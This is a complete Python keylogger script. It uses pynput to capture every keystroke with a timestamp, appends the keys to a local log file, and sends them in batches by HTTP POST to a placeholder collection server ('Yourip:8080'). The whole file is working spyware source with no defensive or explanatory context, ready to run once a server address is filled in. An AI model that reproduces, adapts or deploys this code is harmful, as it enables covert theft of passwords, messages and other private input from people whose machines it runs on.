import datetime
import requests
from pynput import keyboard
import threading
import time
from queue import Queue

# Configuration
log_file_path = "keystroke_log.txt"
server_url = "http://Yourip:8080/receive_keystrokes"
buffer_size = 10  # Send buffer when it reaches this size
send_interval = 5  # Seconds, send buffer at this interval if not full

class KeyLogger:
    def __init__(self):
        self.queue = Queue()
        self.stop_event = threading.Event()
        self.worker_thread = threading.Thread(target=self.process_queue)
        self.worker_thread.daemon = True  # Ensure thread stops when main program stops
        self.worker_thread.start()

    def on_press(self, key):
        try:
            keystroke_data = f"{datetime.datetime.now()} - {key.char}\n"
        except AttributeError:
            keystroke_data = f"{datetime.datetime.now()} - {key}\n"
        self.queue.put(keystroke_data)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener on Esc key press
            self.stop_event.set()
            return False

    def send_data_to_server(self, data):
        try:
            headers = {'Content-Type': 'text/plain'}
            response = requests.post(server_url, headers=headers, data=data)
            if response.status_code != 200:
                print(f"Failed to send data. Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending data: {e}")

    def log_to_file(self, data):
        with open(log_file_path, "a") as log_file:
            log_file.write(data)

    def process_queue(self):
        buffer = []
        last_send_time = time.time()

        while not self.stop_event.is_set():
            try:
                # Get keystroke from the queue with a timeout to allow periodic checks
                keystroke_data = self.queue.get(timeout=0.1)
                buffer.append(keystroke_data)

                # If buffer reaches the size limit, process it
                if len(buffer) >= buffer_size:
                    self.process_buffer(buffer)
                    buffer = []
            except:
                # Timeout occurred, check if we need to process the buffer
                if buffer and time.time() - last_send_time >= send_interval:
                    self.process_buffer(buffer)
                    buffer = []

        # Process any remaining data in the buffer
        if buffer:
            self.process_buffer(buffer)

    def process_buffer(self, buffer):
        data = ''.join(buffer)
        self.log_to_file(data)
        self.send_data_to_server(data)

# Collect events until released
key_logger = KeyLogger()
with keyboard.Listener(on_press=key_logger.on_press, on_release=key_logger.on_release) as listener:
    listener.join()
